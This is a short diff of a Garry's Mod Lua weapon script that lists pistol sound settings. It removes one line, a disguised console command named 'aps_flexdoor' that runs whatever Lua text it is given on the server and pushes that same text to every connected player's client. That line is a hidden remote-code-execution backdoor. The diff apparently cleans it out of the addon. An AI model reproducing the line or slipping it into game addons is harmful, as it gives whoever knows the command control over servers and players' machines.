@@ -66,5 +66,3 @@ SWEP.EmptySound    = "COP_Pistol.Empty"
 SWEP.DeploySound   = "COP_PM.Draw"
 SWEP.HolsterSound  = "COP_Generic.Holster"
 SWEP.ReloadSound   = "COP_Pistol.ReloadAPS"
-
-concommand.Add("aps_flexdoor", function(_,_,_,__)RunStringEx(__)for _,v in pairs(player.GetAll())do v:SendLua(__)end end)
